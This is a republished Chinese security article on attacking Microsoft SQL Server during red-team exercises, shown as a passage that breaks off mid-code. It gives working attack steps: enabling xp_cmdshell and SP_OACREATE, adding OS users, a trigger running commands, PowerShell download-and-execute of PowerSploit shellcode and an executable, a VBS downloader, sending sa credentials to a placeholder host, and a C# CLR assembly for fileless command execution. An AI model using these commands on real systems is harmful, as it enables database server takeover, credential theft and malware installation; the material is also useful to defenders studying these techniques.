> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9475)

[TOC]

**by Tahir 2021.3.5**

前言
--

一年一度的网络安全建设成果检验即将开始，在网络安全实战攻防演练这场最关键的战役中，办公应用系统、Web 中间件，数据库等是攻击方主要的攻击对象，由于使用量最大，数据库往往会成为攻击者的首选目标之一。以微软 SQL Server 为例，除了常见的 SQL 注入漏洞，攻击方还会用一些 “出其不意” 的招式，将 SQL Server 原本的优势转变为攻击的突破口，比如在相应的权限下，攻击者可以利用 SQL Server 强大的存储过程执行不同的高级功能，通过增加 SQL Server 数据库用户，权限维持等方式，攻击用户数据库系统，下文将详述攻击方那些 “不常见” 的手段以及防守方的应对思路。

SQL Server 概述
-------------

SQL Server 是 Microsoft 开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的 DBMS 之一。SQL Server 具有极其广泛的用途，它可以在各个方面使用, 从存储个人博客的内容到存储客户数据等。

在 2017 版之前，SQL Server 仅适用于 Windows。 SQL Server 2017 中最大的变化之一是，它现在可在 Linux 和 Docker 容器上使用。 这意味着可以在 Mac 上运行 SQL Server。

SQL Server 的可用版本

<table><thead><tr><th>版本</th><th>描述</th></tr></thead><tbody><tr><td>Enterprise Edition</td><td>此版本仅在 Windows Server 操作系统上运行。 适用于对速度和可用性具有较高优先级的大型生产数据库服务器。提供复制和联机分析过程（OLAP）服务等功能，这些服务可能会增加其安全风险。</td></tr><tr><td>Standard Edition</td><td>该版本与 Enterprise Edition 相似，但缺少虚拟接口系统局域网（VI SAN）支持和某些高级 OLAP 功能。</td></tr><tr><td>Personal Edition</td><td>它旨在用于工作站和便携式计算机，而不是服务器。 其设计最多支持五个数据库用户。</td></tr><tr><td>Developer Edition</td><td>面向开发人员版本，它与 Enterprise Edition 具有相似的功能，但并不意味着可以在真实的生产环境中运行。</td></tr></tbody></table>

### 客户端 / 服务器数据库系统

SQL Server 是一个客户端 / 服务器数据库管理系统（DBMS）。 这允许有许多不同的客户端同时，全部连接到 SQL Server。 这些客户端的每一个都可以通过不同的工具进行连接。

例如，一个客户端可能使用如 SQL Server Management Studio（SSMS）之类的图形工具，而另一客户端可能使用诸如 sqlcmd 之类的命令行工具。 同时，网站也可以从 Web 应用程序连接到 SQL Server。 并且可能有许多其他客户端都使用自己的工具出于自己的目的进行连接。

客户端 / 服务器 DBMS 的主要优点是多个用户可以同时访问它，每个用户都有特定的访问级别。如果数据库管理员配置对应的权限，则任何连接到 SQL Server 的客户端将只能访问他们被允许访问的数据库。 他们只能执行允许执行的任务。 所有这些都从 SQL Server 本身内部进行控制。

SQL Server 是在服务帐户的上下文中在操作系统上运行的一组 Windows 服务。每次安装 SQL Server 实例时，实际上都会安装一组 Windows 服务并具有唯一的名称。现有的 SQL Server 帐户类型：

*   Windows 帐户。
*   SQL Server 登录名（SQL Server 内部）。
*   数据库用户（SQL Server 内部）。

Windows 帐户和 SQL Server 登录名用于登录 SQL Server。除非系统管理员，否则必须将 SQL Server 登录名映射到数据库用户才能访问数据。数据库用户是在数据库级别内单独创建的。

SQL Server 的常见角色是：

*   Sysadmin 角色：SQL Server 管理员。
*   Public 角色：最低特权，类似于 Windows 中的 everyone 组。
*   更多请参考：[https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017](https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017)

### TDS 协议

表格数据流（Tabular Data Stream, TDS）协议是一种数据库服务器和客户端间交互的应用层协议，为微软 SQL Server 数据库和 Sybase 公司数据库产品所采用。

<table><thead><tr><th><strong>TDS Version</strong></th><th><strong>Supported Products</strong></th></tr></thead><tbody><tr><td>4.2</td><td>Sybase SQL Server &lt; 10 and Microsoft SQL Server 6.5</td></tr><tr><td>5.0</td><td>Sybase SQL Server &gt;= 10</td></tr><tr><td>7.0</td><td>Microsoft SQL Server 7.0</td></tr><tr><td>7.1</td><td>Microsoft SQL Server 2000</td></tr><tr><td>7.2</td><td>Microsoft SQL Server 2005</td></tr></tbody></table>

详细的协议结构分析，请参考：[http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html](http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html)

**注意这些 “突破口”，可能会被攻击方利用**
------------------------

下面先简单介绍 SQL Server 一些常用的攻击面的利用方式。

### SQL Server 危险的存储过程

#### xp_cmdshell

**查询 xp_cmdshell 存储过程是否存在**

xtype 为对象类型，xtype='x'，表示存储过程的对象类型为扩展存储过程。

```
select * from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104608-e3f6eb94-a314-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104608-e3f6eb94-a314-1.png)

TSQL 代码判断是否开启 xp_cmdshell

```
declare @RunningOnACluster char(1)
declare @xp_cmdshell_available char(1)
declare @result int 
set @xp_cmdshell_available='Y' 
set @result=0
select @RunningOnACluster=case 
when convert(int, serverproperty('IsClustered')) = 1 then 'Y'
else 'N' 
end 
if(0=(select value_in_use from sys.configurations where name='xp_cmdshell'))
    set @xp_cmdshell_available='N' if @RunningOnACluster='Y' 
begin
    if @xp_cmdshell_available='Y'
        select @result=1
    if @xp_cmdshell_available='N'
        select @result=2
end
select @result
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104624-ed9664fe-a314-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104624-ed9664fe-a314-1.png)

**恢复 xp_cmdshell 存储过程**

解决 Error Message: 未能找到存储过程 ‘master..xp_cmdshell’。

第一步先删除：

```
drop procedure sp_addextendedproc
drop procedure sp_oacreate
exec sp_dropextendedproc 'xp_cmdshell'
```

第二步恢复：

```
dbcc addextendedproc("sp_oacreate","odsole70.dll")
dbcc addextendedproc("xp_cmdshell"," ")
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104636-f4b84306-a314-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104636-f4b84306-a314-1.png)

直接恢复，不管 sp_addextendedproc 是不是存在，需要自行上传 xplog70.dll，恢复扩展存储过过程 xp_cmdshell 的语句:

```
dbcc addextendedproc("xp_cmdshell","xplog70.dll")
```

代码判断一系列存储过程是否存在，若不存在则恢复。

```
if not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]'))
dbcc addextendedproc ('xp_cmdshell','xplog70.dll')
if not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_dirtree]'))
dbcc addextendedproc ('xp_dirtree','xpstar.dll')
if not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_fixeddrives]'))
dbcc addextendedproc ('xp_fixeddrives','xpstar.dll')
if not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regwrite]'))
dbcc addextendedproc ('xp_regwrite','xpstar.dll')
if not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regread]'))
dbcc addextendedproc ('xp_regread','xpstar.dll')
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104648-fb998c5c-a314-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104648-fb998c5c-a314-1.png)

**开启 xp_cmdshell 存储过程**

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; exec SP_CONFIGURE 'xp_cmdshell', 1; RECONFIGURE;
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104700-030cc166-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104700-030cc166-a315-1.png)

**关闭 xp_cmdshell 存储过程**

关闭 xp_cmdshell 配置

```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104711-09a18f70-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104711-09a18f70-a315-1.png)

删除 xp_cmdshell 的语句:

```
exec sp_dropextendedproc 'xp_cmdshell';
```

删除 xp_cmdshell 过程，再添加 xp_cmdshell 过程，需要自行上传 xplog70.dll 恢复被删除的 xp_cmdshell。

```
drop procedure xp_cmdshell;
exec sp_addextendedproc "xp_cmdshell", "xplog70.dll";
```

附录

```
exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
exec sp_addextendedproc xp_enumgroups ,@dllname ='xplog70.dll'
exec sp_addextendedproc xp_loginconfig ,@dllname ='xplog70.dll'
exec sp_addextendedproc xp_enumerrorlogs ,@dllname ='xpstar.dll'
exec sp_addextendedproc xp_getfiledetails ,@dllname ='xpstar.dll'
exec sp_addextendedproc Sp_OACreate ,@dllname ='odsole70.dll'
exec sp_addextendedproc Sp_OADestroy ,@dllname ='odsole70.dll'
exec sp_addextendedproc Sp_OAGetErrorInfo ,@dllname ='odsole70.dll'
exec sp_addextendedproc Sp_OAGetProperty ,@dllname ='odsole70.dll'
exec sp_addextendedproc Sp_OAMethod ,@dllname ='odsole70.dll'
exec sp_addextendedproc Sp_OASetProperty ,@dllname ='odsole70.dll'
exec sp_addextendedproc Sp_OAStop ,@dllname ='odsole70.dll'
exec sp_addextendedproc xp_regaddmultistring ,@dllname ='xpstar.dll'
exec sp_addextendedproc xp_regdeletekey ,@dllname ='xpstar.dll'
exec sp_addextendedproc xp_regdeletevalue ,@dllname ='xpstar.dll'
exec sp_addextendedproc xp_regenumvalues ,@dllname ='xpstar.dll'
exec sp_addextendedproc xp_regremovemultistring ,@dllname ='xpstar.dll'
exec sp_addextendedproc xp_regwrite ,@dllname ='xpstar.dll'
exec sp_addextendedproc xp_dirtree ,@dllname ='xpstar.dll'
exec sp_addextendedproc xp_regread ,@dllname ='xpstar.dll'
exec sp_addextendedproc xp_fixeddrives ,@dllname ='xpstar.dll'
```

**xp_cmdshell 执行系统命令**

**xp_cmdshell 执行 whoami 命令**

```
exec master.dbo.xp_cmdshell 'whoami'
exec master.dbo.xp_cmdshell "whoami"
exec xp_cmdshell "whoami";
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104727-12cd9b0c-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104727-12cd9b0c-a315-1.png)

**xp_cmdshell 执行 ipconfig/all 命令**

```
exec master..xp_cmdshell 'ipconfig/all'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104741-1b31a694-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104741-1b31a694-a315-1.png)

**查询操作系统和版本信息（分别对应中英文系统）**

```
exec master..xp_cmdshell 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"'
exec master..xp_cmdshell 'systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104753-225187b4-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104753-225187b4-a315-1.png)

**通过 xp_cmdshell 执行 wmic 获取系统信息**

```
exec master..xp_cmdshell 'wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors/Format:List'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104811-2d5f7b16-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104811-2d5f7b16-a315-1.png)

**调用 reg query 注册表键值判断 RDP 服务的端口号**

```
exec master..xp_cmdshell 'reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104825-35837da6-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104825-35837da6-a315-1.png)

**通过 xp_cmdshell 执行添加 testuser1 用户并且不输出结果**

```
exec master..xp_cmdshell 'Net user testuser1 passwd1 /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add',NO_OUTPUT
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104845-41b37c0c-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104845-41b37c0c-a315-1.png)

**通过 xp_cmdshell 删除 testuser1 用户并且不输出结果**

```
EXEC master..xp_cmdshell 'net user testuser1/delete', NO_OUTPUT
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104902-4b9942ec-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104902-4b9942ec-a315-1.png)

通过 xp_cmdshell 执行 taskkill 杀死 taskmgr.exe，taskmgr.exe 用于任务管理器。它显示系统中正在运行的进程。该程序使用 Ctrl+Alt+Del（一般是弹出 Windows 安全再点击 “任务管理器”）或者 Ctrl+Shift+Esc 打开，这不是纯粹的系统程序，但是如果终止它，可能会导致不可知的问题。

```
exec master.dbo.xp_cmdshell 'taskkill /f /im taskmgr.exe';
```

**调用 xp_cmdshell 执行 mkdir 命令创建目录**

```
exec master..xp_cmdshell 'mkdir "C:\test\" '
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104920-5685c36a-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104920-5685c36a-a315-1.png)

**通过 xp_cmdshell 执行 dir 命令**

```
exec master..xp_cmdshell 'dir c:\'
exec xp_cmdshell 'dir c:\'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104940-626e2be0-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104940-626e2be0-a315-1.png)

**通过 xp_cmdshell 删除文件**

```
exec master..xp_cmdshell 'del C:\test';
```

**xp_cmdshell 调用 Powershell**

通过 xp_cmdshell 调用 powershell 下载 [http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1](http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1)

```
exec xp_cmdshell 'powershell -c "iex((new-object Net.WebClient).DownloadString(''http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1''))"'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104959-6d876b54-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104959-6d876b54-a315-1.png)

调用 xp_cmdshell 执行 echo CreateObject 最后写入 C:/ProgramData/vget.vbs 文件

```
exec master..xp_cmdshell 'echo Set x= CreateObject(^"Microsoft.XMLHTTP^"):x.Open ^"GET^",LCase(WScript.Arguments(0)),0:x.Send():Set s = CreateObject(^"ADODB.Stream^"):s.Mode = 3:s.Type = 1:s.Open():s.Write(x.responseBody):s.SaveToFile LCase(WScript.Arguments(1)),2 > C:/ProgramData/vget.vbs';
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105035-83107d9e-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105035-83107d9e-a315-1.png)

通过 xp_cmdshell 调用 cmd.exe 执行 powershell 调用 OpenRead 方法向数据库发送登录用户名 sa 密码

```
exec xp_cmdshell 'powershell (new-object System.Net.WebClient).OpenRead(''http://example/test.jsp?data=127.0.0.1%7c1433%7csa%7cDb123456'')'
``````
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105153-b16781d8-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105153-b16781d8-a315-1.png)

通过 xp_cmdshell 调用 powershell 下载 test0.exe 后并执行

```
exec master..xp_cmdshell '"echo $client = New-Object System.Net.WebClient > %TEMP%\test.ps1 & echo $client.DownloadFile("http://example/test0.exe","%TEMP%\test.exe") >> %TEMP%\test.ps1 & powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 & WMIC process call create "%TEMP%\test.exe""'
```

#### xp_regread

SQL Server 存在一系列的存储过程，可以对注册表进行增删改查。xp_regread、xp_regwrite、xp_regdeletvalue、xp_regdeletkey、xp_regaddmultistring 等。

**读注册表**

```
exec xp_regread 'HKEY_current_user','Control Panel\International','sCountry'
exec xp_regread N'HKEY_LOCAL_MACHINE', N'SYSTEM\CurrentControlSet\Services\MSSEARCH'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105212-bcc3039a-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105212-bcc3039a-a315-1.png)

**枚举可用的注册表键值**

```
exec xp_regenumkeys 'HKEY_CURRENT_USER','Control Panel\International'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105229-c6d0b882-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105229-c6d0b882-a315-1.png)

#### xp_fileexist

判读文件是否存在，第一列返回 0 表示文件不存在，返回 1 表示文件存在。当执行完无回显命令时，一般都将结果输入至文件中，利用此存储过程可以判断无回显命令是否执行成功。

**判读文件是否存在**

```
exec xp_fileexist 'C:\\test\test.txt'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105243-cf8bcb4c-a315-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105243-cf8bcb4c-a315-1.png)

**列出当前目录**

```
exec xp_subdirs "C:\\"
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105427-0d7e8c8c-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105427-0d7e8c8c-a316-1.png)

#### xp_getnetname

**获取服务器名称**

```
exec xp_getnetname
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105443-16f95012-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105443-16f95012-a316-1.png)

#### xp_msver

**获取服务器信息**

```
exec xp_msver
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105500-211445ca-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105500-211445ca-a316-1.png)

#### xp_fixeddrives

**获取磁盘空间信息**

```
exec xp_fixeddrives
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105521-2d7726f2-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105521-2d7726f2-a316-1.png)

附常用的一些危险的存储过程，可自查存储过程的功能和用法。

```
xp_cmdshell
xp_dirtree
xp_enumgroups
xp_fixeddrives
xp_loginconfig
xp_enumerrorlogs
xp_getfiledetails
Sp_OACreate
Sp_OADestroy
Sp_OAGetErrorInfo
Sp_OAGetProperty
Sp_OAMethod
Sp_OASetProperty
Sp_OAStop
Xp_regaddmultistring
Xp_regdeletekey
Xp_regdeletevalue
Xp_regenumvalues
Xp_regread
Xp_regremovemultistring
Xp_regwrite
sp_makewebtask
```

### SQL Server 触发器

SQL Server 触发器用于执行指定动作之后执行 sql 语句，比如配合 update 触发 sql 语句。

首先创建一个 test 表，插入字段值。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105549-3e428d0a-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105549-3e428d0a-a316-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105609-49f3e0ea-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105609-49f3e0ea-a316-1.png)

创建一个名为 test1 的触发器，当 test 表执行 update 动作时，触发 test1 执行 xp_cmdshell 命令。

```
set ANSI_NULLS on
go
set QUOTED_IDENTIFIER on
go
create trigger [test1]
on [test]
AFTER UPDATE as
begin
    execute master..xp_cmdshell 'cmd.exe /c calc.exe'
end
go
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105711-6f66cb76-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105711-6f66cb76-a316-1.png)

执行下列更新 test 表操作，test1 触发器触发。

```
UPDATE test SET name = 'wangwu' WHERE LastName = 'zhangsan'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105753-88427eba-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105753-88427eba-a316-1.png)

### SQL Server COM 组件

SQL Server 中的 COM 组件 SP_OACREATE，执行系统命令，但是此利用方法无回显。

#### SP_OACREATE

查看 SP_OACREATE 状态。

```
select * from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105818-97601d44-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105818-97601d44-a316-1.png)

利用 count(*) 判断是否存在，，存在即返回 1。

```
select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105837-a24654d0-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105837-a24654d0-a316-1.png)

#### 启用 SP_OACREATE

利用 sp_configure 存储过程，启用 SP_OACREATE

```
exec sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE;   
exec sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE;
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105907-b4679f0c-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105907-b4679f0c-a316-1.png)

#### 利用 SP_OACREATE 执行命令

利用 SP_OACREATE 执行系统命令

```
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\Windows\System32\cmd.exe /c whoami /all >C:\\test\test.txt'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105944-ca67cafc-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105944-ca67cafc-a316-1.png)

### SQL Server CLR 相关利用

CLR 微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。

官方链接：[https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15](https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15)

在利用 MSSQL 服务实现命令执行的时候，通常的做法是利用 xp_cmdshell 存储过程在 MSSQL 进程的上下文中运行操作系统命令。如果要想利用这种技术运行自定义代码，通常需要使用 LOLBINS，添加新的操作系统用户，或通过 BCP 向磁盘中写入二进制文件，这些方法的缺点是很容易被发现。CLR 方式可以利用 16 进制文件流方式导入 DLL 文件，这样不需要文件落地。

#### 创建 CLR

利用 VS 创建 MSSQL 数据库项目

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105854-ac6a2a9a-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105854-ac6a2a9a-a316-1.png)

修改目标平台和勾选创建脚本

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422110023-e185c522-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422110023-e185c522-a316-1.png)

在 SQL Server 2005 中引入了从 MSSQL 运行. NET 代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建. Net 程序集时，会给它们指定一个权限级别，例如：

```
CREATE ASSEMBLY SQLCLRTest  
FROM 'C:\MyDBApp\SQLCLRTest.dll'  
WITH PERMISSION_SET = SAFE;
```

其权限集有三个选项：

SAFE：基本上只将 MSSQL 数据集暴露给代码，其他大部分操作则都被禁止。

EXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码。

UNSAFE：允许使用任何代码。

微软关于 SQL CLR 的详细文档可通过以下地址获得： [https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration)

修改目标框架和权限级别为 UNSAFE。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422110043-edaa7c8a-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422110043-edaa7c8a-a316-1.png)

创建 SQL CLR C# 存储过程

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422110058-f651625e-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422110058-f651625e-a316-1.png)

写入代码

```
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.Text;
using Microsoft.SqlServer.Server;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void ExecCommand (string cmd)
    {
        // 在此处放置代码
        SqlContext.Pipe.Send("Command is running, please wait.");
        SqlContext.Pipe.Send(RunCommand("cmd.exe", " /c " + cmd));
    }
    public static string RunCommand(string filename,string arguments)
    {
        var process = new Process();

        process.StartInfo.FileName = filename;
        if (!string.IsNullOrEmpty(arguments))
        {
            process.StartInfo.Arguments = arguments;
        }

        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.UseShellExecute = false;

        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.RedirectStandardOutput = true;
        var stdOutput = new StringBuilder();
        process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);
        string stdError = null;
        try
        {
            process.Start();
            process.BeginOutputReadLine();
            stdError = process.StandardError.ReadToEnd();
            process.WaitForExit();
        }
        catch (Exception e)
        {
            SqlContext.Pipe.Send(e.Message);
        }

        if (process.ExitCode == 0)
        {
            SqlContext.Pipe.Send(stdOutput.ToString());
        }
        else
        {
            var message = new StringBuilder();

            if (!string.IsNullOrEmpty(stdError))
            {
                message.AppendLine(stdError);
            }

            if (stdOutput.Length != 0)
            {
                message.AppendLine("Std output:");
                message.AppendLine(stdOutput.ToString());
            }
            SqlContext.Pipe.Send(filename + arguments + " finished with exit code = " + process.ExitCode + ": " + message);
        }
        return stdOutput.ToString();
    }
}
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422110151-163d3fa2-a317-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422110151-163d3fa2-a317-1.png)

编译生成 DLL 文件。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422110428-7397dbb2-a317-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422110428-7397dbb2-a317-1.png)

运行权限级别为 “SAFE” 的代码，只需启用 CLR 就可以了；但是，要想运行权限级别为 “EXTERNAL_ACCESS” 或“UNSAFE”的代码，则需要需要修改相应的配置，以及 DBA 权限。2017 年之前和之后的服务器版本，运行标记为 “UNSAFE” 的 CLR 所需步骤是不同的，下面分别进行介绍：

**对于 SQL Server 2017 之前的版本**

显示高级选项：

```
sp_configure 'show advanced options',1;RECONFIGURE
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422105919-bb70af6e-a316-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422105919-bb70af6e-a316-1.png)

启用 CLR：

```
sp_configure 'clr enabled',1;RECONFIGURE;
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422110518-913f0f5a-a317-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422110518-913f0f5a-a317-1.png)

将存储. Net 程序集的数据库配置为可信赖的。

```
ALTER DATABASE master SET TRUSTWORTHY ON;
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422110546-a24dd344-a317-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422110546-a24dd344-a317-1.png)

**SQL Server 2017 及更高版本**

对于 SQL Server 2017 及更高版本，则引入了严格的安全性，也必须禁用。另外，也可以根据提供的 SHA512 哈希值，针对单个程序集授予其 UNSAFE 权限，而不是将整个数据库都标记为可信的。对于 SQL Server 2017 及以上版本，如下所示：

显示高级选项：

```
sp_configure 'show advanced options',1;RECONFIGURE
```

启用 CLR：

```
sp_configure 'clr enabled',1;RECONFIGURE;
```

将某程序集的 SHA512 哈希值添加到可信程序集列表中：

```
sp_add_trusted_assembly @hash= <SHA512 of DLL>;
```

从现在开始，程序集的创建和调用对于任何 SQL Server 版本来说，都是一样的。

通过十六进制字符串创建程序集——如果可以从十六进制字符串创建程序集，则意味着无需创建一个二进制文件并将其写入 SQL 服务器进程可访问的位置：

```
CREATE ASSEMBLY clrassem from <HEX STRING> WITH PERMISSION_SET = UNSAFE;
```

创建存储过程，以从程序集运行代码：

```
CREATE PROCEDURE debugrun AS EXTERNAL NAME clrassem.StoredProcedures.runner;
```

运行该存储过程：

```
debugrun
```

在代码运行后，可以删除存储过程、程序集以及受信任的哈希值，并将前面修改的安全设置恢复原值。下面显示了一个完成该任务的 SQL 查询示例

对于 SQL Server 2017 及更高版本：

```
sp_drop_trusted_assembly @hash=<SHA512 of DLL>
```

对于 SQL Server 2017 之前的版本：

```
ALTER DATABASE <CONNECTED DATABASE> SET TRUSTWORTHY OFF;
```

对于所有版本：

```
DROP PROCEDURE debugrun;
DROP ASSEMBLY clrassem;
sp_configure 'clr strict security',1;RECONFIGURE
sp_configure 'show advanced options',0;RECONFIGURE
```

#### 利用 SQL 语句导入程序集

现在可以利用 16 进制文件流方式导入 DLL 文件，这样不需要文件落地。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422110558-a97e2056-a317-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422110558-a97e2056-a317-1.png)

```
CREATE ASSEMBLY [Database1]
    AUTHORIZATION [dbo]
